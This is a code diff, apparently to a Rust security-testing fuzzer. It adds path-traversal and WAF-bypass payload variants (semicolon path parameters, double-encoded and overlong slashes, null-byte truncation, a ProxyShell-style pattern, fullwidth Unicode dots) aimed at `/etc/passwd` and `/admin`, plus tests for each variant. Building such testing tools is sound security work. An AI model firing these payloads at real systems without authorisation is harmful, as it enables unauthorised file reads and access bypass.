@@ -115,6 +115,51 @@ pub fn mutate(payload: &str) -> Vec<String> {
         );
     }
 
+    // ── Path-routing parser-disagreement family (Tsai class) ─────────
+    // Frontend (WAF / proxy / CDN) and backend (origin app) often
+    // disagree on path canonicalisation. The frontend strips one form,
+    // the backend keeps it — and the routing decision flips. Every
+    // variant below has been observed in real CVEs / bounty reports
+    // against IIS, Tomcat, Spring Boot, nginx, traefik, etc.
+    //
+    // We use the inferred target (e.g. `/etc/passwd`) but the same
+    // patterns work to reach `/admin`, `/internal/`, etc — these are
+    // generic routing-bypass primitives.
+    let stripped = target.trim_start_matches('/');
+    for routing in [
+        // Semicolon parameter (Java EE / Tomcat strip; nginx doesn't).
+        format!("/public/..;/{stripped}"),
+        format!("/public/..;jsessionid=x/{stripped}"),
+        // Double-encoded slash (frontend single-decodes, backend double-decodes).
+        format!("/public/..%2f{stripped}"),
+        format!("/public/..%252f{stripped}"),
+        format!("/public/..%5c{stripped}"),     // backslash variant
+        format!("/public/..%c0%af{stripped}"),  // overlong UTF-8 slash
+        // Fragment / query injection in path position (some routers strip,
+        // some don't). The Orange Tsai ProxyShell pattern.
+        format!("/public/?@{stripped}"),
+        format!("/public/#/{stripped}"),
+        format!("/public/%23/{stripped}"),
+        // Null in path — IIS truncates at \0, others don't.
+        format!("/public/%00/{stripped}"),
+        format!("/{stripped}/%00.json"),
+        format!("/{stripped}/.json"),
+        // Trailing-dot / trailing-space (Windows paths normalise these
+        // away, Linux doesn't — and routers disagree).
+        format!("/{stripped}."),
+        format!("/{stripped}/."),
+        format!("/{stripped}%20"),
+        format!("/{stripped}/"),
+        // Path-parameter mid-segment.
+        format!("/admin;/{stripped}"),
+        format!("/static/..;/{stripped}"),
+        // Unicode normalisation tricks: fullwidth slash sometimes folds
+        // to / at the backend but not at the WAF.
+        format!("/public/\u{FF0E}\u{FF0E}/{stripped}"),
+    ] {
+        push(routing, &mut results, &mut seen);
+    }
+
     // Drop the original payload from the variant list (we don't want to
     // re-send it; it's the baseline).
     results.retain(|v| v != payload);
@@ -240,6 +285,55 @@ mod tests {
             mutations
                 .iter()
                 .any(|item| item.contains("/proc/self/root/etc/passwd"))
+        );
+    }
+
+    // ── Path-routing parser-disagreement (Tsai class) ────────────────
+
+    #[test]
+    fn generates_semicolon_path_parameter_strip() {
+        // Tomcat / Java EE strip everything between `;` and `/`. nginx
+        // doesn't. So `/public/..;/admin` reaches `/admin` after Tomcat
+        // canonicalises but nginx routed it as `/public`.
+        let m = mutate("../../../etc/passwd");
+        assert!(
+            m.iter().any(|s| s.contains("/public/..;/etc/passwd")),
+            "no semicolon path-param variant"
+        );
+    }
+
+    #[test]
+    fn generates_double_encoded_traversal() {
+        let m = mutate("../../../etc/passwd");
+        assert!(m.iter().any(|s| s.contains("%252f")));
+    }
+
+    #[test]
+    fn generates_proxy_shell_pattern() {
+        // The Orange Tsai ProxyShell shape — `?@` between fake-allowed
+        // prefix and real target.
+        let m = mutate("../../../etc/passwd");
+        assert!(
+            m.iter().any(|s| s.contains("/public/?@etc/passwd")),
+            "no ProxyShell-pattern variant"
+        );
+    }
+
+    #[test]
+    fn generates_null_truncation_iis_pattern() {
+        let m = mutate("../../../etc/passwd");
+        assert!(m.iter().any(|s| s.contains("%00.json")));
+    }
+
+    #[test]
+    fn generates_unicode_fullwidth_dot() {
+        // Unicode fullwidth dot \u{FF0E} folds to ASCII `.` under NFKC
+        // normalisation. WAF often doesn't normalise; backend often does.
+        let m = mutate("../../../etc/passwd");
+        assert!(
+            m.iter()
+                .any(|s| s.contains('\u{FF0E}') && s.contains("etc/passwd")),
+            "no fullwidth-dot routing variant"
         );
     }
 }
